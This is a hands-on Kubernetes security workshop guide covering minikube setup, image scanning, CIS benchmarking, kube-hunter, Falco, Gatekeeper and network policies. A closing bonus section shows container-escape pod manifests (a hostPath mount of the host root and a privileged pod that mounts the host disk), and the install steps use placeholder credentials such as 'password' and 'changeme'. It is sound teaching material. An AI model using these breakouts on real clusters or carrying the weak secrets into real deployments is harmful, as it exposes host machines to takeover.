Module 1: Kubernetes Basics
Lab 1: Installing Kubernetes Locally with Minikube
Install Minikube
Mac: Install minikube with Homebrew
brew install minikube

Mac: Install minikube from terminal
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-darwin-amd64
sudo install minikube-darwin-amd64 /usr/local/bin/minikube

Windows: Install with chocolatey and install a bash client
choco install minikube
choco install git

Install Docker
Use the appropriate installer for your system here https://www.docker.com/

Start Minikube
Ensure Docker is running on your machine, and use the command below to initialize a minikube cluster using Docker as the driver.

minikube start --kubernetes-version=v1.26.5


Verify that you are able to connect to the new cluster by listing the pods in the cluster

kubectl get pods --all-namespaces

Advanced
The Calico cni supports network policies, unlike Minikube’s default cni. Project Falco requires using the hyperkit or virtualbox driver. We’ll use the default options for the majority of this lab, and circle back to this for the Project Falco & network policy sections. 

# Advanced options to use calico CNI and other drivers
minikube start --cni calico --kubernetes-version=v1.26.5
minikube start --cni calico --driver=hyperkit
minikube start --cni calico --driver=virtualbox
# Destroy your minikube cluster so you can create a new one with different options
minikube delete



More at  https://minikube.sigs.k8s.io/docs/start/
Kubectl Cheat Sheet
Now that Kubernetes is running, you can use the kubectl CLI to interact with your Kubernetes API. These are some commonly used commands you may find helpful.



kubectl config get-contexts
kubectl config use-context <context>
kubectl config set-context –current –namespace=default

kubectl apply -f kubespec.yml
kubectl run <podname> --image <imagename>
kubectl get pods -o wide
kubectl describe pod <podname>
kubectl get pod <podname> -o yaml
kubectl delete pod <podname>
kubectl logs <podname> -c <containername>
kubectl edit pod <podname>

More at https://kubernetes.io/docs/reference/kubectl/cheatsheet/.  Check out k9s or kops for UI based alternatives to kubectl.
Lab 2: Running a Pod in Kubernetes
We will install a pod (and instance of an application) in kubernetes by creating a local file (shown below) called mypod.yml and then applying the manifest to Kubernetes. These files that describe what kubernetes should do are called manifests.

Create a file called mypod.yml
This file will tell Kubernetes how to create our pod. It will run nginx, and allow access to port 80.

apiVersion: v1
kind: Pod
metadata:
  name: nginx-example
spec:
  containers:
  - name: nginx
    image: nginx
    ports:
    - containerPort: 80

Deploy it with kubectl
This command tells Kubernetes to take the file, and create all the Kubernetes objects defined in it. In our case, it will create a single pod called nginx-example.

kubectl apply -f mypod.yml

Validate it deployed
Validate that the nginx-example is listed in the list of pods. Wait for the pod to be marked with a Running status by re-running this command every few seconds until it is.

kubectl get pods --all-namespaces

Port-forward to it
This command will make port 80 of the pod accessible on your machine’s port 8080. After running this, you will be able to go to http://127.0.0.1:8080/ in your browser, and see nginx’s welcome page. Exit the port-forward process on the command line once you are done.


kubectl port-forward nginx-example 8080:80

Open a command-line in the pod and see that nginx is running
You can open a shell in a running pod using the kubectl exec command.

kubectl exec --stdin --tty nginx-example -- /bin/bash



Once inside, we can use apt to install procps. That will allow us to run ps aux, which will list all the running processes. You’ll notice that there are only a handful of processes running, which includes nginx and the commands from your shell session. This is because you are only seeing processes running on that pod.


apt update
apt install procps
ps aux
Whoami

Finally, use exit to close the shell and return to running commands on your machine.

exit

Challenge Task
Review the kubernetes documentation at https://kubernetes.io/docs/home/ and deploy nginx using a deployment instead of just deploying a pod. See how Kubernetes handles the deployment of a certain number of replicas for you. 


Lab 2b: Shortcut to Run a Pod in Kubernetes
We will install a pod (and instance of an application) in kubernetes by calling the kubectl shortcut shown below. The shortcuts format is: kubectl run [podname] --image=[imagename] [other options]

Run the following command

kubectl run nginx-example-2 --image=nginx --restart=Never

Go through the steps outlined in Lab 2(a) to validate the pod works as expected. Note that the pod’s name in this case is “nginx-example-2”.
Module 2: Container Security
Lab 3: Building a Container
We will create a simple docker image that hosts an HTML file with the web server nginx. You will need to use a plain-text editor of your choosing for this lab. 

Install Docker - https://docs.docker.com/get-docker/ 
Create a file called index.html. We will use nginx to display this web page:
<b>HELLO FROM DOCKER!</b>
Create a file named Dockerfile. This defines the container we want Docker to create for us:
FROM nginx:alpine
COPY index.html /usr/share/nginx/html/index.html
Build the image by running the following from the command line:
docker build -t myimage .
Run image locally with docker and open up http://127.0.0.1:8080/ in a web browser. You should see your index.html page being displayed.
docker run -p8080:80 -it myimage
Stop your running Docker container by killing the docker run command (to conserve memory)

Lab 4: Installing M9sweeper
We will use M9sweeper to run the various open source Kubernetes security tools. While they can be run stand-alone, we are using m9sweeper because it provides an easy-to-use user interface to examine the results from each tool. 

Install helm
Helm is a tool that allows you to create charts, which are effectively templates of Kubernetes manifests. By passing the appropriate arguments to a helm command, it handle filling in the templates and deploying them for you. This makes managing Kubernetes deployments with many manifests easy, and allows deploying to multiple environments easy.

Use the instructions appropriate for your system to install helm from https://helm.sh/


Install m9sweeper (using the helm command below).
This may take a couple of minutes to complete. You the command: `kubectl get pods -n m9sweeper-system` to see all of the components boot up.

Helm will be taking all of the values provided in the below command, and using them to fill in the m9seeper helm chart and deploy numerous Kubernetes manifests
helm repo add m9sweeper https://m9sweeper.github.io/m9sweeper && \
helm repo update && \
helm upgrade m9sweeper m9sweeper/m9sweeper --install --wait --timeout 10m \
  --create-namespace --namespace m9sweeper-system \
  --set-string dash.init.superAdminEmail="super.admin@m9sweeper.io" \
  --set-string dash.init.superAdminPassword="password" \
  --set-string global.jwtSecret="changeme" \
  --set-string global.apiKey="trawlerapikey" \
  --set-string global.kubeHunterApiKey="kubehunterapikey" \
  --set-string global.kubeBenchApiKey="kubebenchapikey" \
  --set-string global.falcoApiKey="falcoapikey" \
  --set-string dash.image.registry="ghcr.io" \
  --set-string dash.image.repository="m9sweeper/dash" \
  --set-string trawler.image.registry="ghcr.io" \
  --set-string trawler.image.repository="m9sweeper/trawler" \
  --set-string rabbitmq.image.repository="ghcr.io/m9sweeper/rabbitmq" \
  --set-string rabbitmq.image.tag="3.12.4-alpine" \
  --set-string postgresql.image.repository="ghcr.io/m9sweeper/postgres" \
  --set-string postgresql.volumePermissions.image.repository="ghcr.io/m9sweeper/debian" \
  --set-string dash.kubesec.registry="ghcr.io" \
  --set-string dash.kubesec.repository="m9sweeper/kubesec"


Port-forward to the m9sweeper UI
Use the command below to  port forward to m9sweeper’s UI pod. Open http://127.0.0.1:3000/ in your local browser to see the UI.
kubectl port-forward service/m9sweeper-dash -n m9sweeper-system 3000:3000
Sign in to the m9sweeper UI
Use these credentials: super.admin@m9sweeper.io / password. Click around the UI and explore the options available.
Lab 5: Scanning Pods (kubesec) and Images (trivy) with M9sweeper
Now that m9sweeper is installed, let's use it to scan pods and images. 

Look at the info for your cluster
From the main page, click on the default cluster’s card. This is your local cluster that you installed m9sweeper in.
Look at pods and images
Under Workloads, you can view all the namespaces in your cluster. And click through to see all the pods and images running within them.
You can also go to the images page to view all images that your m9sweeper instance has found in the cluster.
View an image details
Choose an image from under either Workloads or Images and click on it. A page will open listing its name, image ID, and latest scan results. A dropdown on the “Scanner Compliance Report” card allows you to choose which scan to view. Issues from the selected scan populate the bottom card.
Review the scan results of the image. 
You can see whether m9sweeper considers the image compliant based on the default compliance settings. There will be a table of issues at the bottom of the page with more details on exactly what issues it considered.
Run Kubesec
Kubesec is a security risk analysis tool, it looks for issues with the security configuration of Kubernetes pods. 
Navigate to the Kubesec page using the left navigation. Try running Kubesec against the nginx-example pod you created earlier in the lab. (Hint: it was created in the default namespace).
Once you have run Kubesec, take a look through the results it generates.
Challenge
Deploy a new pod using the busybox image. Run Kubesec against it.
Modify the spec for that pod to add a securityContext to ensure the pod does not run as root. (Hint: check out the documentation here: https://kubernetes.io/docs/tasks/configure-pod-container/security-context/.)
Redeploy the pod with the securityContext (Hint: for some changes, you can not update a pod, so you will need to delete the original pod before running kubectl apply)
Run Kubesec against the new version of the pod. You should see it giving you points for not running as root.
Module 3: Security Benchmarking and Intrusion Detection
Lab 6: Scan Your Cluster against CIS Benchmarks with Kube-Bench
Kube-bench is  a tool that will scan your cluster to check how it matches up to the CIS security Benchmarks (https://www.cisecurity.org/benchmark/kubernetes)

Navigate to the kube-bench page
Login to M9sweeper, select the default cluster, and then click on kube-bench.
Run kube-bench
Using the ‘Run Audit’ button will open a dialog giving you all of the available options for running kube-bench. For now, we’ll just run it once using the command below.
helm repo add m9sweeper https://m9sweeper.github.io/m9sweeper && \
helm repo update && \
helm upgrade --install kube-bench m9sweeper/kube-bench \
  -n m9sweeper-system --create-namespace \
  --set-string reportsurl='http://m9sweeper-dash:3000/api/kube-bench/1/?key=kubebenchapikey' \
  --set-string provider=master \
  --set cronjob.enabled=false \
  --set-string image.repository='ghcr.io/m9sweeper/kube-bench'

Wait for it to finish
You can use `kubectl -n m9sweeper-system get pods` to check for the kube-bench pod to become marked as completed. Once it is, refresh the kube-bench page.
View the Results
The scan will appear in the Past Audits table. Click it to view the details. Click around and see what kube-bench found
Lab 7: Perform a Penetration Test with Kube-Hunter
Kube-hunter is a tool that will try to explore you kubernetes cluster to find any vulnerabilities ti can.
Navigate to the kube-hunter page
Login to M9sweeper, select the default cluster, and then click on kube-hunter.
Run kube-bench
Using the ‘Run Audit’ button will open a dialog giving you all of the available options for running kube-hunter. For now, we’ll just run it once using the command below.
helm repo add m9sweeper https://m9sweeper.github.io/m9sweeper && \
helm repo update && \
helm upgrade --install kube-hunter m9sweeper/kube-hunter \
  -n m9sweeper-system --create-namespace \
  --set-string dispatchUrl='http://m9sweeper-dash:3000/api/kubehunter/hunter/1/?key=kubehunterapikey' \
  --set cronjob.enabled=false \
  --set-string image.repository='ghcr.io/m9sweeper/kube-hunter'

Wait for it to complete
Use `kubectl -n m9sweeper-system get pods` to check the status of the pods, and wait for the kube-bench pod to be marked as Completed. Once it is, refresh the kube-hunter page.
Review the results
Click the audit from the Past Audits table. You can see what vulnerabilities kube-hunter found with your cluster.
Lab 8: Install Project Falco and Monitor for Suspicious Applications
Project Falco is a tool that will monitor for suspicious activity.
Note: Project Falco may not function properly or at all on devices with arm64 processors.
Navigate to the Falco page
Login to M9sweeper, select the default cluster, and then click on Falco.
Install Falco
Using the Install’ button will open a dialog giving you options for installing Falco. We’ll run it using the command below.
helm repo add falcosecurity https://falcosecurity.github.io/charts && \
helm repo update && \
helm upgrade --install falco falcosecurity/falco \
  --wait --version 3.1.5 \
  --namespace falco --create-namespace \
  --set-string falco.driver.kind=ebpf \
  --set falco.tty=true \
  --set falco.json_output=true \
  --set falco.http_output.enabled=true \
  --set-string falco.http_output.url='http://falco-falcosidekick:2801/' \
  --set falcosidekick.enabled=true \
  --set-string falcosidekick.config.webhook.address='http://m9sweeper-dash.m9sweeper-system.svc:3000/api/falco/1/create/?key=falcoapikey' \
  --set falcosidekick.config.webhook.checkcert=true \
  --set-string image.registry='ghcr.io' \
  --set-string image.repository='m9sweeper/falco-no-driver' \
  --set-string driver.loader.initContainer.image.registry='ghcr.io' \
  --set-string driver.loader.initContainer.image.repository='m9sweeper/falco-driver-loader' \
  --set-string falcosidekick.image.registry='ghcr.io' \
  --set-string falcosidekick.image.repository='m9sweeper/falcosidekick'

Open a command-shell in your nginx pod
Run this command to simulate suspicious activity happening that Proejct Falco should detect.
kubectl exec --stdin --tty nginx-example -- /bin/bash
sh -c 'echo hello world'
exit
View the results
Refresh the page in Project Falco and see how it detected this potentially suspicious action and reported on it in the Recent Events table. 
Module 4: Policy Management
Lab 9: Pod Security Admission
Enable pod security admissions for default namespace.
Use this command to open the namepspace’s manifest for editting
kubectl edit namespace default
Add a abel
Add the underlined section under labels to the manifest. (Using vim, hit i to change to insert mode)
apiVersion: v1
kind: Namespace
metadata:
  labels:
    kubernetes.io/metadata.name: default
    pod-security.kubernetes.io/enforce: restricted
  name: default
Save changes
Using vim, press esc, type :wq and hit enter
Verify
Delete your nginx-example pod (kubectl delete nginx-example). Try to recreate the pod. Kubernetes will return an Forbidden error, and prevent the creation of that pod
Cleanup
Remove the label from your namespace. 
Lab 10: OPA Gatekeeper
Gatekeeper allows you to set policies to validate pods. It can be configured to warn or block pods that do not meet its policies
Navigate to the Gatekeeper page
Login to M9sweeper, select the default cluster, and then click on Gatekeeper.
Install Gatekeeper
helm repo add gatekeeper https://open-policy-agent.github.io/gatekeeper/charts && \
helm repo update && \
helm upgrade --install gatekeeper gatekeeper/gatekeeper \
  --namespace gatekeeper-system --create-namespace \
  --set-string image.repository='ghcr.io/m9sweeper/gatekeeper' \
  --set-string image.crdRepository='ghcr.io/m9sweeper/gatekeeper-crds' \
  --set-string postUpgrade.labelNamespace.image.repository='ghcr.io/m9sweeper/gatekeeper-crds' \
  --set-string postInstall.labelNamespace.image.repository='ghcr.io/m9sweeper/gatekeeper-crds' \
  --set-string postInstall.probeWebhook.image.repository='ghcr.io/m9sweeper/curl' \
  --set-string preUninstall.deleteWebhookConfigurations.image.repository='ghcr.io/m9sweeper/gatekeeper-crds' \
  --version 3.12.0 --wait --timeout 10m

Install Gatekeeper Constraints
Click the ‘Add more’ button above the Contraint Template table.
Choose ‘containerlimits’ under general & Save changes
Click into k8scontainerlimits in the table
Click Add more on the constraints table there. Use the default settings, with these changes, then save changes
Name: container-limits
Description: My container limit constraint
Mode: Enforce
Cpu: 1
Memory: 250Mi

Verify the enforcement
Delete your nginx-example pod. And attempt to redeploy it. It should be blocked, as it does not meet the requirements of the constraint you created.
Challenge (Optional) - Make your spec meet the constraint requirements
The constraint you implemented, requires that pods request at most 250Mi of memory, and 1 CPU. Your nginx-example manifest, doesn’t state how many resources it is requesting at all!. Add resource requests to make your pod spec compliant with the constraint and deploy it.
Documentation about resources: https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/
Browse the database of constraints
There are many constraints built into m9sweeper. Try enabling a few constraint templates and constraints.
Cleanup
Make sure that all constraints are removed, or something that you want to keep on in your cluster, so they don’t interfere with anything else you do.
Lab 11: Network Policies (optional)
Network policies allow you to set rules on network traffic for both egress (outgoing) and ingress (incoming) traffic.

To do this lab, you’ll need to use the calico cni in your minikube cluster, as the default cni does not support network policies.
To stop your running minikube cluster and restart it using the calico cni:
minikube stop
minikube start —-cni=calico


More details can be found here https://minikube.sigs.k8s.io/docs/handbook/network_policy/

Install wget on your nginx pod
Use the commands below to install wget, and test that it can access external sites

kubectl exec --stdin --tty nginx-example -- /bin/bash
apt update
apt install wget
wget -qO -- https://m9sweeper.io/
exit


Install a network policy denying all egress traffic
Put the below spec into a file and apply it using kubectl apply. This Network policy will prevent all egress (outgoing) traffic from your cluster.

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-egress
spec:
  podSelector: {}
  policyTypes:
  - Egress
Confirm the rule is being applied
Now when you run wget from within your nginx container, you should no longer be able to reach external sites.
kubectl exec --stdin --tty nginx -- /bin/bash
wget -qO -- https://m9sweeper.io/
exit


Cleanup
Remove the network policy. 
kubectl delete networkpolicy default-deny-egress


Bonus Lab: Kubernetes Security Exploits
Method 1: Host Path
You could deploy a pod with a host path that mounts a path in the root machine, effectively granting you access to the entire machine. Note that if you grant someone (a developer, a cicd pipeline, or even a service account) too much access they could do this to easily break out. 

apiVersion: v1
kind: Pod
metadata:
  name: test-pd
spec:
  containers:
  - image: nginx:bookworm
    name: test-container
    volumeMounts:
    - mountPath: /mnt/hole
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
Method 2: Exploit Privileged Access
Deploy a pod with privileged:
apiVersion: v1
kind: Pod
metadata:
  name: nginx
spec:
  containers:
  - image: nginx:bookworm
    name: nginx
    securityContext: 
      allowPrivilegeEscalation: true
      privileged: true
status: {}

Then open a command shell (as if broken into) and run these commands: (may be /dev/sda1 instead of /dev/vda1)
mkdir /mnt/hole
mount /dev/vda1 /mnt/hole
Appendix
CDK - Kubernetes Exploitation Toolkit
Docker Breakout Guide
Another Docker Breakout Guide
Yet Another Docker Breakout Guide
Kubernetes Pentesting Guide
